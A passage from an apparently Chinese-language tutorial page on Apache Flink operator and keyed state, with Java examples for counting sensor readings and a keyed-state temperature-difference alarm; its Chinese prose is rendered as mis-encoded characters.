<ul><li>å¦‚æœä¸€ä¸ªç®—å­æœ‰å¤šé¡¹ä»»åŠ¡ï¼Œè€Œå®ƒçš„æ¯é¡¹ä»»åŠ¡çŠ¶æ€åˆéƒ½ç›¸åŒï¼Œé‚£ä¹ˆè¿™ç§ç‰¹æ®Šæƒ…å†µæœ€é€‚åˆåº”ç”¨å¹¿æ’­çŠ¶æ€</li></ul></li></ul><h5 id="æµ‹è¯•ä»£ç -1"><a href="#æµ‹è¯•ä»£ç -1" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><p>å®é™…ä¸€èˆ¬ç”¨ç®—å­çŠ¶æ€æ¯”è¾ƒå°‘ï¼Œä¸€èˆ¬è¿˜æ˜¯é”®æ§çŠ¶æ€ç”¨å¾—å¤šä¸€ç‚¹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.MapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.checkpoint.ListCheckpointed;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 4:05 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest1_OperatorState</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socketæ–‡æœ¬æµ</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªæœ‰çŠ¶æ€çš„mapæ“ä½œï¼Œç»Ÿè®¡å½“å‰åˆ†åŒºæ•°æ®ä¸ªæ•°</span></span><br><span class="line">    SingleOutputStreamOperator&lt;Integer&gt; resultStream = dataStream.map(<span class="keyword">new</span> MyCountMapper());</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰MapFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCountMapper</span> <span class="keyword">implements</span> <span class="title">MapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Integer</span>&gt;, <span class="title">ListCheckpointed</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªæœ¬åœ°å˜é‡ï¼Œä½œä¸ºç®—å­çŠ¶æ€</span></span><br><span class="line">    <span class="keyword">private</span> Integer count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      count++;</span><br><span class="line">      <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">snapshotState</span><span class="params">(<span class="keyword">long</span> checkpointId, <span class="keyword">long</span> timestamp)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> Collections.singletonList(count);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">restoreState</span><span class="params">(List&lt;Integer&gt; state)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="keyword">for</span> (Integer num : state) &#123;</span><br><span class="line">        count += num;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥(æœ¬åœ°å¼€å¯socketåè¾“å…¥)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,35.8</span><br><span class="line">sensor_1,1547718199,35.8</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h4 id="é”®æ§çŠ¶æ€-Keyed-State"><a href="#é”®æ§çŠ¶æ€-Keyed-State" class="headerlink" title="é”®æ§çŠ¶æ€ Keyed State"></a>é”®æ§çŠ¶æ€ Keyed State</h4><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108430338">Flink_Flinkä¸­çš„çŠ¶æ€</a></p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906182710217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=CEwwJ&originHeight=395&originWidth=1022&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> é”®æ§çŠ¶æ€æ˜¯æ ¹æ®è¾“å…¥æ•°æ®æµä¸­å®šä¹‰çš„é”®ï¼ˆkeyï¼‰æ¥ç»´æŠ¤å’Œè®¿é—®çš„ã€‚ </li><li> <strong>Flink ä¸ºæ¯ä¸ªkeyç»´æŠ¤ä¸€ä¸ªçŠ¶æ€å®ä¾‹ï¼Œå¹¶å°†å…·æœ‰ç›¸åŒé”®çš„æ‰€æœ‰æ•°æ®ï¼Œéƒ½åˆ†åŒºåˆ°åŒä¸€ä¸ªç®—å­ä»»åŠ¡ä¸­ï¼Œè¿™ä¸ªä»»åŠ¡ä¼šç»´æŠ¤å’Œå¤„ç†è¿™ä¸ªkeyå¯¹åº”çš„çŠ¶æ€ã€‚</strong> </li><li> <strong>å½“ä»»åŠ¡å¤„ç†ä¸€æ¡æ•°æ®æ—¶ï¼Œä»–ä¼šè‡ªåŠ¨å°†çŠ¶æ€çš„è®¿é—®èŒƒå›´é™å®šä¸ºå½“å‰æ•°æ®çš„key</strong>ã€‚ </li></ul><h5 id="é”®æ§çŠ¶æ€æ•°æ®ç»“æ„"><a href="#é”®æ§çŠ¶æ€æ•°æ®ç»“æ„" class="headerlink" title="é”®æ§çŠ¶æ€æ•°æ®ç»“æ„"></a>é”®æ§çŠ¶æ€æ•°æ®ç»“æ„</h5><ul><li>å€¼çŠ¶æ€(value state) <ul><li>å°†çŠ¶æ€è¡¨ç¤ºä¸ºå•ä¸ªçš„å€¼</li></ul></li><li>åˆ—è¡¨çŠ¶æ€(List state) <ul><li>å°†çŠ¶æ€è¡¨ç¤ºä¸ºä¸€ç»„æ•°æ®çš„åˆ—è¡¨</li></ul></li><li>æ˜ å°„çŠ¶æ€(Map state) <ul><li>å°†çŠ¶æ€è¡¨ç¤ºä¸ºä¸€ç»„key-valueå¯¹</li></ul></li><li><strong>èšåˆçŠ¶æ€(Reducing state &amp; Aggregating State)</strong> <ul><li>å°†çŠ¶æ€è¡¨ç¤ºä¸ºä¸€ä¸ªç”¨äºèšåˆæ“ä½œçš„åˆ—è¡¨</li></ul></li></ul><h5 id="æµ‹è¯•ä»£ç -2"><a href="#æµ‹è¯•ä»£ç -2" class="headerlink" title="æµ‹è¯•ä»£ç "></a>æµ‹è¯•ä»£ç </h5><p><img src="https://img-blog.csdnimg.cn/20200906183806458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=AyZr1&originHeight=640&originWidth=1134&originalType=binary&ratio=1&status=done&style=none"></p><p><em>æ³¨ï¼šå£°æ˜ä¸€ä¸ªé”®æ§çŠ¶æ€ï¼Œä¸€èˆ¬åœ¨ç®—å­çš„open()ä¸­å£°æ˜ï¼Œå› ä¸ºè¿è¡Œæ—¶æ‰èƒ½è·å–ä¸Šä¸‹æ–‡ä¿¡æ¯</em></p><ul><li> javaæµ‹è¯•ä»£ç   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.RichMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 5:41 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest2_KeyedState</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ = 1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ä»æœ¬åœ°socketè¯»å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬æ¢æˆSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨è‡ªå®šä¹‰mapæ–¹æ³•ï¼Œé‡Œé¢ä½¿ç”¨ æˆ‘ä»¬è‡ªå®šä¹‰çš„Keyed State</span></span><br><span class="line">    DataStream&lt;Integer&gt; resultStream = dataStream</span><br><span class="line">      .keyBy(SensorReading::getId)</span><br><span class="line">      .map(<span class="keyword">new</span> MyMapper());</span><br><span class="line"></span><br><span class="line">    resultStream.print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰mapå¯Œå‡½æ•°ï¼Œæµ‹è¯• é”®æ§çŠ¶æ€</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyMapper</span> <span class="keyword">extends</span> <span class="title">RichMapFunction</span>&lt;<span class="title">SensorReading</span>,<span class="title">Integer</span>&gt;</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//        Exception in thread &quot;main&quot; java.lang.IllegalStateException: The runtime context has not been initialized.</span></span><br><span class="line">    <span class="comment">//        ValueState&lt;Integer&gt; valueState = getRuntimeContext().getState(new ValueStateDescriptor&lt;Integer&gt;(&quot;my-int&quot;, Integer.class));</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ValueState&lt;Integer&gt; valueState;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å…¶å®ƒç±»å‹çŠ¶æ€çš„å£°æ˜</span></span><br><span class="line">    <span class="keyword">private</span> ListState&lt;String&gt; myListState;</span><br><span class="line">    <span class="keyword">private</span> MapState&lt;String, Double&gt; myMapState;</span><br><span class="line">    <span class="keyword">private</span> ReducingState&lt;SensorReading&gt; myReducingState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      valueState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Integer&gt;(<span class="string">&quot;my-int&quot;</span>, Integer.class));</span><br><span class="line"></span><br><span class="line">      myListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;String&gt;(<span class="string">&quot;my-list&quot;</span>, String.class));</span><br><span class="line">      myMapState = getRuntimeContext().getMapState(<span class="keyword">new</span> MapStateDescriptor&lt;String, Double&gt;(<span class="string">&quot;my-map&quot;</span>, String.class, Double.class));</span><br><span class="line">      <span class="comment">//            myReducingState = getRuntimeContext().getReducingState(new ReducingStateDescriptor&lt;SensorReading&gt;())</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿™é‡Œå°±ç®€å•çš„ç»Ÿè®¡æ¯ä¸ª ä¼ æ„Ÿå™¨çš„ ä¿¡æ¯æ•°é‡</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">map</span><span class="params">(SensorReading value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// å…¶å®ƒçŠ¶æ€APIè°ƒç”¨</span></span><br><span class="line">      <span class="comment">// list state</span></span><br><span class="line">      <span class="keyword">for</span>(String str: myListState.get())&#123;</span><br><span class="line">        System.out.println(str);</span><br><span class="line">      &#125;</span><br><span class="line">      myListState.add(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">      <span class="comment">// map state</span></span><br><span class="line">      myMapState.get(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">      myMapState.put(<span class="string">&quot;2&quot;</span>, <span class="number">12.3</span>);</span><br><span class="line">      myMapState.remove(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">      <span class="comment">// reducing state</span></span><br><span class="line">      <span class="comment">//            myReducingState.add(value);</span></span><br><span class="line"></span><br><span class="line">      myMapState.clear();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Integer count = valueState.value();</span><br><span class="line">      <span class="comment">// ç¬¬ä¸€æ¬¡è·å–æ˜¯nullï¼Œéœ€è¦åˆ¤æ–­</span></span><br><span class="line">      count = count==<span class="keyword">null</span>?<span class="number">0</span>:count;</span><br><span class="line">      ++count;</span><br><span class="line">      valueState.update(count);</span><br><span class="line">      <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="åœºæ™¯æµ‹è¯•"><a href="#åœºæ™¯æµ‹è¯•" class="headerlink" title="åœºæ™¯æµ‹è¯•"></a>åœºæ™¯æµ‹è¯•</h5><p>å‡è®¾åšä¸€ä¸ªæ¸©åº¦æŠ¥è­¦ï¼Œå¦‚æœä¸€ä¸ªä¼ æ„Ÿå™¨å‰åæ¸©å·®è¶…è¿‡10åº¦å°±æŠ¥è­¦ã€‚è¿™é‡Œä½¿ç”¨é”®æ§çŠ¶æ€Keyed State + flatMapæ¥å®ç°</p><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.state;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.RichFlatMapFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple3;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/2 6:37 PM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StateTest3_KeyedStateApplicationCase</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºæ‰§è¡Œç¯å¢ƒ</span></span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    <span class="comment">// è®¾ç½®å¹¶è¡Œåº¦ = 1</span></span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// ä»socketè·å–æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line">    <span class="comment">// è½¬æ¢ä¸ºSensorReadingç±»å‹</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    SingleOutputStreamOperator&lt;Tuple3&lt;String, Double, Double&gt;&gt; resultStream = dataStream.keyBy(SensorReading::getId).flatMap(<span class="keyword">new</span> MyFlatMapper(<span class="number">10.0</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å¦‚æœ ä¼ æ„Ÿå™¨æ¸©åº¦ å‰åå·®è·è¶…è¿‡æŒ‡å®šæ¸©åº¦(è¿™é‡ŒæŒ‡å®š10.0),å°±æŠ¥è­¦</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFlatMapper</span> <span class="keyword">extends</span> <span class="title">RichFlatMapFunction</span>&lt;<span class="title">SensorReading</span>, <span class="title">Tuple3</span>&lt;<span class="title">String</span>, <span class="title">Double</span>, <span class="title">Double</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŠ¥è­¦çš„æ¸©å·®é˜ˆå€¼</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Double threshold;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®°å½•ä¸Šä¸€æ¬¡çš„æ¸©åº¦</span></span><br><span class="line">    ValueState&lt;Double&gt; lastTemperature;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyFlatMapper</span><span class="params">(Double threshold)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.threshold = threshold;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// ä»è¿è¡Œæ—¶ä¸Šä¸‹æ–‡ä¸­è·å–keyedState</span></span><br><span class="line">      lastTemperature = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Double&gt;(<span class="string">&quot;last-temp&quot;</span>, Double.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// æ‰‹åŠ¨é‡Šæ”¾èµ„æº</span></span><br><span class="line">      lastTemperature.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatMap</span><span class="params">(SensorReading value, Collector&lt;Tuple3&lt;String, Double, Double&gt;&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      Double lastTemp = lastTemperature.value();</span><br><span class="line">      Double curTemp = value.getTemperature();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// å¦‚æœä¸ä¸ºç©ºï¼Œåˆ¤æ–­æ˜¯å¦æ¸©å·®è¶…è¿‡é˜ˆå€¼ï¼Œè¶…è¿‡åˆ™æŠ¥è­¦</span></span><br><span class="line">      <span class="keyword">if</span> (lastTemp != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(curTemp - lastTemp) &gt;= threshold) &#123;</span><br><span class="line">          out.collect(<span class="keyword">new</span> Tuple3&lt;&gt;(value.getId(), lastTemp, curTemp));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 